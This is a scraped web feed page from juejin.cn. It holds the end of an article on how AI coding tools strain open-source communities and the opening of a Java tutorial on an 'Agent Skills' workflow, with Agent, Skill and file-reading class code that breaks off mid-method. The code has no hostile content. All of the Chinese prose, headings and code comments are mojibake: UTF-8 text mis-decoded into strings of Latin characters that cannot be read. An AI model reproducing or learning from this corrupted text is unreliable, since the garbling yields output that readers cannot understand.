<p>AI ç¼–ç¨‹å·¥å…·æ­£åœ¨æ”¹å˜è½¯ä»¶å¼€å‘çš„ç”Ÿæ€ï¼Œä½†åŒæ—¶ä¹Ÿå¯¹å¼€æºç¤¾åŒºå¸¦æ¥äº†å‰æ‰€æœªæœ‰çš„æŒ‘æˆ˜ã€‚å½“å¼€å‘è€…è¶Šæ¥è¶Šä¾èµ– AI æ¥ç”Ÿæˆä»£ç ï¼Œå¼€æºç»´æŠ¤è€…ä»¬æ­£åœ¨å¤±å»ä¸ç”¨æˆ·çš„è”ç³»ï¼Œè¿›è€Œå¤±å»äº†ä»–ä»¬çš„æ”¶å…¥æ¥æºå’Œç¤¾åŒºæ”¯æŒã€‚</p>
<p>è¿™ä¸ä»…ä»…æ˜¯ç»æµé—®é¢˜ï¼Œæ›´æ˜¯æ•´ä¸ªå¼€æºç”Ÿæ€ç³»ç»Ÿçš„ç”Ÿå­˜å±æœºã€‚æ­£å¦‚è®ºæ–‡æ‰€è­¦å‘Šçš„é‚£æ ·ï¼Œ"æ°›å›´ç¼–ç¨‹"å¯èƒ½æ­£åœ¨ä¸€æ­¥æ­¥æ‰¼æ€å¼€æºçš„æ ¹åŸºã€‚</p>
<p><strong>æ¬¢è¿å…³æ³¨å¾®ä¿¡å…¬ä¼—å·ï¼šå€”å¼ºé’é“œä¸‰ï¼Œè·å–æ›´å¤š AI å’ŒæŠ€æœ¯é¢†åŸŸçš„æ·±åº¦è§£è¯»ï¼</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Agent Skillså·¥ä½œæµï¼šä»å…¥é—¨åˆ°å®æˆ˜]]></title>    <link>https://juejin.cn/post/7600994087588053011</link>    <guid>https://juejin.cn/post/7600994087588053011</guid>    <pubDate>2026-01-31T01:51:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600994087588053011" data-draft-id="7600986495927205929" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Agent Skillså·¥ä½œæµï¼šä»å…¥é—¨åˆ°å®æˆ˜"/> <meta itemprop="keywords" content="Java,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-31T01:51:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é›¨ä¸­é£˜è¡çš„è®°å¿†"/> <meta itemprop="url" content="https://juejin.cn/user/694547077666606"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Agent Skillså·¥ä½œæµï¼šä»å…¥é—¨åˆ°å®æˆ˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/694547077666606/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é›¨ä¸­é£˜è¡çš„è®°å¿†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-31T01:51:22.000Z" title="Sat Jan 31 2026 01:51:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Agent Skillså·¥ä½œæµï¼šä»å…¥é—¨åˆ°å®æˆ˜</h2>
<h3 data-id="heading-1">å‰è¨€</h3>
<p>åœ¨äººå·¥æ™ºèƒ½å¿«é€Ÿå‘å±•çš„ä»Šå¤©ï¼ŒAgentæ™ºèƒ½ä½“æŠ€æœ¯æ­£åœ¨æ”¹å˜æˆ‘ä»¬æ„å»ºåº”ç”¨çš„æ–¹å¼ã€‚Agent Skillså·¥ä½œæµä½œä¸ºè¿æ¥æ™ºèƒ½ä½“ä¸å…·ä½“èƒ½åŠ›çš„æ¡¥æ¢ï¼Œä¸ºå¼€å‘è€…æä¾›äº†ä¸€ç§çµæ´»ã€å¯æ‰©å±•çš„æ¶æ„æ¨¡å¼ã€‚æœ¬æ–‡å°†ä»åŸºç¡€æ¦‚å¿µå‡ºå‘ï¼Œç»“åˆå®é™…æ¡ˆä¾‹ï¼Œå¸¦ä½ æ·±å…¥äº†è§£Agent Skillsçš„è®¾è®¡ä¸å®ç°ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c2bc2d2a5214350b58a5a623a9f951c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770429086&amp;x-signature=iRvpk%2FUHq4gqhdUvRPQgam2Auqo%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-2">ä¸€ã€ä»€ä¹ˆæ˜¯Agent Skills</h3>
<h4 data-id="heading-3">1.1 æ ¸å¿ƒæ¦‚å¿µ</h4>
<p><strong>Agentï¼ˆæ™ºèƒ½ä½“ï¼‰</strong>ï¼šå…·æœ‰è‡ªä¸»å†³ç­–èƒ½åŠ›çš„å®ä½“ï¼Œèƒ½å¤Ÿç†è§£ä»»åŠ¡ã€è§„åˆ’è¡ŒåŠ¨å¹¶æ‰§è¡Œæ“ä½œã€‚</p>
<p><strong>Skillï¼ˆæŠ€èƒ½ï¼‰</strong>ï¼šAgentå¯ä»¥è°ƒç”¨çš„å…·ä½“èƒ½åŠ›å•å…ƒï¼Œå¦‚æ–‡ä»¶è¯»å–ã€æ•°æ®æŸ¥è¯¢ã€æ–‡æœ¬åˆ†æç­‰ã€‚</p>
<p><strong>Agent Skillså·¥ä½œæµ</strong>ï¼šAgenté€šè¿‡è¯†åˆ«ä»»åŠ¡éœ€æ±‚ï¼ŒåŠ¨æ€é€‰æ‹©å¹¶è°ƒç”¨åˆé€‚çš„Skillï¼Œæœ€ç»ˆå®Œæˆç”¨æˆ·ç›®æ ‡çš„è¿‡ç¨‹ã€‚</p>
<h4 data-id="heading-4">1.2 æ¶æ„è®¾è®¡</h4>
<p>Agent Skillsæ¶æ„åŒ…å«å››ä¸ªæ ¸å¿ƒå±‚æ¬¡ï¼š</p>
<ul>
<li><strong>Agent Core</strong>ï¼šæ™ºèƒ½ä½“æ ¸å¿ƒï¼Œè´Ÿè´£å†³ç­–å’Œåè°ƒ</li>
<li><strong>Skill Registry</strong>ï¼šæŠ€èƒ½æ³¨å†Œä¸­å¿ƒï¼Œç®¡ç†æ‰€æœ‰å¯ç”¨æŠ€èƒ½</li>
<li><strong>Execution Engine</strong>ï¼šæ‰§è¡Œå¼•æ“ï¼Œå¤„ç†æŠ€èƒ½è°ƒç”¨å’Œé”™è¯¯é‡è¯•</li>
<li><strong>Skill Implementations</strong>ï¼šå…·ä½“æŠ€èƒ½å®ç°å±‚</li>
</ul>
<p>è¿™ç§åˆ†å±‚è®¾è®¡ç¡®ä¿äº†ç³»ç»Ÿçš„å¯æ‰©å±•æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚</p>
<h3 data-id="heading-5">äºŒã€æ ¸å¿ƒç»„ä»¶å®ç°</h3>
<h4 data-id="heading-6">2.1 Agentæ¥å£è®¾è®¡</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.agent;

<span class="hljs-keyword">import</span> com.example.skills.Skill;
<span class="hljs-keyword">import</span> com.example.skills.SkillResult;

<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-comment">/**
 * Agentæ™ºèƒ½ä½“æ¥å£
 * å®šä¹‰Agentçš„åŸºæœ¬è¡Œä¸ºå’Œèƒ½åŠ›
 * <span class="hljs-doctag">@version</span> 1.0.0
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Agent</span> {

    <span class="hljs-comment">/**
     * è·å–Agentåç§°
     */</span>
    String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>;

    <span class="hljs-comment">/**
     * è·å–Agentæè¿°
     */</span>
    String <span class="hljs-title function_">getDescription</span><span class="hljs-params">()</span>;

    <span class="hljs-comment">/**
     * æ‰§è¡Œä»»åŠ¡
     *
     * <span class="hljs-doctag">@param</span> task ä»»åŠ¡å†…å®¹
     * <span class="hljs-doctag">@param</span> context æ‰§è¡Œä¸Šä¸‹æ–‡
     * <span class="hljs-doctag">@return</span> æ‰§è¡Œç»“æœ
     */</span>
    AgentResult <span class="hljs-title function_">execute</span><span class="hljs-params">(String task, AgentContext context)</span>;

    <span class="hljs-comment">/**
     * æ³¨å†ŒæŠ€èƒ½
     *
     * <span class="hljs-doctag">@param</span> skill æŠ€èƒ½å®ä¾‹
     */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerSkill</span><span class="hljs-params">(Skill skill)</span>;

    <span class="hljs-comment">/**
     * è·å–å·²æ³¨å†Œçš„æ‰€æœ‰æŠ€èƒ½
     */</span>
    java.util.Collection&lt;Skill&gt; <span class="hljs-title function_">getSkills</span><span class="hljs-params">()</span>;

    <span class="hljs-comment">/**
     * Agentæ‰§è¡Œç»“æœ
     */</span>
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentResult</span> {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> success;
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String message;
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object data;
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> executionTime;

        <span class="hljs-keyword">public</span> <span class="hljs-title function_">AgentResult</span><span class="hljs-params">(<span class="hljs-type">boolean</span> success, String message, Object data, <span class="hljs-type">long</span> executionTime)</span> {
            <span class="hljs-built_in">this</span>.success = success;
            <span class="hljs-built_in">this</span>.message = message;
            <span class="hljs-built_in">this</span>.data = data;
            <span class="hljs-built_in">this</span>.executionTime = executionTime;
        }

        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> AgentResult <span class="hljs-title function_">success</span><span class="hljs-params">(String message, Object data)</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AgentResult</span>(<span class="hljs-literal">true</span>, message, data, <span class="hljs-number">0</span>);
        }

        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> AgentResult <span class="hljs-title function_">success</span><span class="hljs-params">(String message, Object data, <span class="hljs-type">long</span> executionTime)</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AgentResult</span>(<span class="hljs-literal">true</span>, message, data, executionTime);
        }

        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> AgentResult <span class="hljs-title function_">failure</span><span class="hljs-params">(String message)</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AgentResult</span>(<span class="hljs-literal">false</span>, message, <span class="hljs-literal">null</span>, <span class="hljs-number">0</span>);
        }

        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isSuccess</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> success;
        }

        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getMessage</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> message;
        }

        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getData</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> data;
        }

        <span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title function_">getExecutionTime</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> executionTime;
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"AgentResult{"</span> +
                    <span class="hljs-string">"success="</span> + success +
                    <span class="hljs-string">", message='"</span> + message + <span class="hljs-string">'\''</span> +
                    <span class="hljs-string">", data="</span> + data +
                    <span class="hljs-string">", executionTime="</span> + executionTime + <span class="hljs-string">"ms"</span> +
                    <span class="hljs-string">'}'</span>;
        }
    }
}

</code></pre>
<p>Agentæ¥å£å®šä¹‰äº†æ™ºèƒ½ä½“çš„åŸºæœ¬è¡Œä¸ºï¼Œå…¶ä¸­æœ€å…³é”®çš„æ˜¯<code>execute</code>æ–¹æ³•ï¼Œå®ƒæ¥æ”¶ä»»åŠ¡å’Œä¸Šä¸‹æ–‡ï¼Œè¿”å›æ‰§è¡Œç»“æœã€‚</p>
<h4 data-id="heading-7">2.2 Skillæ¥å£è®¾è®¡</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.skills;

<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-comment">/**
 * SkillæŠ€èƒ½æ¥å£
 * å®šä¹‰Agentå¯ä»¥æ‰§è¡Œçš„å…·ä½“æŠ€èƒ½
 * <span class="hljs-doctag">@version</span> 1.0.0
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Skill</span> {

    <span class="hljs-comment">/**
     * è·å–æŠ€èƒ½åç§°
     */</span>
    String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>;

    <span class="hljs-comment">/**
     * è·å–æŠ€èƒ½æè¿°
     */</span>
    String <span class="hljs-title function_">getDescription</span><span class="hljs-params">()</span>;

    <span class="hljs-comment">/**
     * è·å–æŠ€èƒ½ç‰ˆæœ¬
     */</span>
    <span class="hljs-keyword">default</span> String <span class="hljs-title function_">getVersion</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"1.0.0"</span>;
    }

    <span class="hljs-comment">/**
     * åˆ¤æ–­æŠ€èƒ½æ˜¯å¦å¯ä»¥æ‰§è¡Œè¯¥ä»»åŠ¡
     *
     * <span class="hljs-doctag">@param</span> task ä»»åŠ¡å†…å®¹
     * <span class="hljs-doctag">@return</span> æ˜¯å¦å¯ä»¥æ‰§è¡Œ
     */</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">canExecute</span><span class="hljs-params">(String task)</span>;

    <span class="hljs-comment">/**
     * æ‰§è¡ŒæŠ€èƒ½
     *
     * <span class="hljs-doctag">@param</span> task ä»»åŠ¡å†…å®¹
     * <span class="hljs-doctag">@param</span> parameters å‚æ•°
     * <span class="hljs-doctag">@return</span> æ‰§è¡Œç»“æœ
     */</span>
    SkillResult <span class="hljs-title function_">execute</span><span class="hljs-params">(String task, Map&lt;String, Object&gt; parameters)</span>;

    <span class="hljs-comment">/**
     * è·å–æŠ€èƒ½çš„è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰
     * é»˜è®¤30ç§’
     */</span>
    <span class="hljs-keyword">default</span> <span class="hljs-type">long</span> <span class="hljs-title function_">getTimeout</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-number">30000</span>;
    }

    <span class="hljs-comment">/**
     * æŠ€èƒ½æ‰§è¡Œå‰çš„éªŒè¯
     *
     * <span class="hljs-doctag">@param</span> task ä»»åŠ¡å†…å®¹
     * <span class="hljs-doctag">@param</span> parameters å‚æ•°
     * <span class="hljs-doctag">@return</span> éªŒè¯æ˜¯å¦é€šè¿‡
     */</span>
    <span class="hljs-keyword">default</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">validate</span><span class="hljs-params">(String task, Map&lt;String, Object&gt; parameters)</span> {
        <span class="hljs-keyword">return</span> task != <span class="hljs-literal">null</span> &amp;&amp; !task.trim().isEmpty();
    }

    <span class="hljs-comment">/**
     * æŠ€èƒ½æ‰§è¡Œåçš„æ¸…ç†
     */</span>
    <span class="hljs-keyword">default</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cleanup</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// é»˜è®¤ä¸éœ€è¦æ¸…ç†</span>
    }
}

</code></pre>
<p>Skillæ¥å£é‡‡ç”¨ç­–ç•¥æ¨¡å¼ï¼Œæ¯ä¸ªæŠ€èƒ½å®ç°ç‹¬ç«‹çš„åŠŸèƒ½ï¼Œå¹¶é€šè¿‡<code>canExecute</code>æ–¹æ³•å£°æ˜è‡ªå·±èƒ½å¤„ç†å“ªäº›ä»»åŠ¡ã€‚</p>
<h4 data-id="heading-8">2.3 æŠ€èƒ½è°ƒç”¨æµç¨‹</h4>
<p>å®Œæ•´çš„æŠ€èƒ½è°ƒç”¨æµç¨‹åŒ…æ‹¬10ä¸ªæ­¥éª¤ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d81964197c964a8ead67b9ddf715333e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770429086&amp;x-signature=Q01D015VgZmn1k5nK%2BasnAO%2BD6g%3D" alt="" loading="lazy"/></p>
<ol>
<li>æ¥æ”¶ç”¨æˆ·è¯·æ±‚</li>
<li>è§£æä»»åŠ¡æ„å›¾</li>
<li>åŒ¹é…å¯ç”¨æŠ€èƒ½</li>
<li>éªŒè¯æ‰§è¡Œæƒé™</li>
<li>å‡†å¤‡æ‰§è¡Œå‚æ•°</li>
<li>è°ƒç”¨æŠ€èƒ½æ¥å£</li>
<li>ç›‘æ§æ‰§è¡ŒçŠ¶æ€</li>
<li>å¤„ç†æ‰§è¡Œç»“æœ</li>
<li>è¿”å›å“åº”æ•°æ®</li>
<li>æ›´æ–°æ‰§è¡Œå†å²</li>
</ol>
<p>æ¯ä¸ªæ­¥éª¤éƒ½æœ‰å…¶ç‰¹å®šçš„èŒè´£ï¼Œç¡®ä¿ä»»åŠ¡èƒ½å¤Ÿå®‰å…¨ã€é«˜æ•ˆåœ°æ‰§è¡Œã€‚</p>
<h3 data-id="heading-9">ä¸‰ã€åŸºç¡€æŠ€èƒ½å®ç°</h3>
<h4 data-id="heading-10">3.1 æ–‡ä»¶è¯»å–æŠ€èƒ½</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.skills.impl;

<span class="hljs-keyword">import</span> com.example.skills.Skill;
<span class="hljs-keyword">import</span> com.example.skills.SkillResult;
<span class="hljs-keyword">import</span> org.slf4j.Logger;
<span class="hljs-keyword">import</span> org.slf4j.LoggerFactory;

<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;
<span class="hljs-keyword">import</span> java.nio.file.Files;
<span class="hljs-keyword">import</span> java.nio.file.Path;
<span class="hljs-keyword">import</span> java.nio.file.Paths;
<span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.List;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-comment">/**
 * æ–‡ä»¶è¯»å–æŠ€èƒ½
 * ç”¨äºè¯»å–æœ¬åœ°æ–‡ä»¶å†…å®¹
 * <span class="hljs-doctag">@version</span> 1.0.0
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileReadSkill</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Skill</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(FileReadSkill.class);

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"FileReadSkill"</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDescription</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"è¯»å–æœ¬åœ°æ–‡ä»¶å†…å®¹ï¼Œæ”¯æŒæ–‡æœ¬æ–‡ä»¶ã€é…ç½®æ–‡ä»¶ç­‰"</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">canExecute</span><span class="hljs-params">(String task)</span> {
        <span class="hljs-keyword">if</span> (task == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-type">String</span> <span class="hljs-variable">lowerTask</span> <span class="hljs-operator">=</span> task.toLowerCase();
        <span class="hljs-keyword">return</span> lowerTask.contains(<span class="hljs-string">"æ–‡ä»¶"</span>) &amp;&amp;
               (lowerTask.contains(<span class="hljs-string">"è¯»å–"</span>) || lowerTask.contains(<span class="hljs-string">"æ‰“å¼€"</span>) || lowerTask.contains(<span class="hljs-string">"æŸ¥çœ‹"</span>));
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">validate</span><span class="hljs-params">(String task, Map&lt;String, Object&gt; parameters)</span> {
        <span class="hljs-keyword">if</span> (!Skill.<span class="hljs-built_in">super</span>.validate(task, parameters)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }

        <span class="hljs-comment">// æ£€æŸ¥æ–‡ä»¶è·¯å¾„å‚æ•°</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">filePath</span> <span class="hljs-operator">=</span> parameters.get(<span class="hljs-string">"filePath"</span>);
        <span class="hljs-keyword">if</span> (filePath == <span class="hljs-literal">null</span>) {
            logger.warn(<span class="hljs-string">"filePath parameter is missing"</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }

        <span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> Paths.get(filePath.toString());
        <span class="hljs-keyword">if</span> (!Files.exists(path)) {
            logger.warn(<span class="hljs-string">"File does not exist: {}"</span>, filePath);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }

        <span class="hljs-keyword">if</span> (!Files.isReadable(path)) {
            logger.warn(<span class="hljs-string">"File is not readable: {}"</span>, filePath);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }

        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> SkillResult <span class="hljs-title function_">execute</span><span class="hljs-params">(String task, Map&lt;String, Object&gt; parameters)</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();

        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">String</span> <span class="hljs-variable">filePath</span> <span class="hljs-operator">=</span> parameters.get(<span class="hljs-string">"filePath"</span>).toString();

            logger.info(<span class="hljs-string">"Reading file: {}"</span>, filePath);

            <span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> Paths.get(filePath);

            <span class="hljs-comment">// è¯»å–æ–‡ä»¶å†…å®¹</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Files.readAllBytes(path), StandardCharsets.UTF_8);

            <span class="hljs-comment">// è·å–æ–‡ä»¶ä¿¡æ¯</span>
            <span class="hljs-type">long</span> <span class="hljs-variable">fileSize</span> <span class="hljs-operator">=</span> Files.size(path);
            <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> path.getFileName().toString();

            <span class="hljs-comment">// æ„å»ºå…ƒæ•°æ®</span>
            Map&lt;String, Object&gt; metadata = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.HashMap&lt;&gt;();
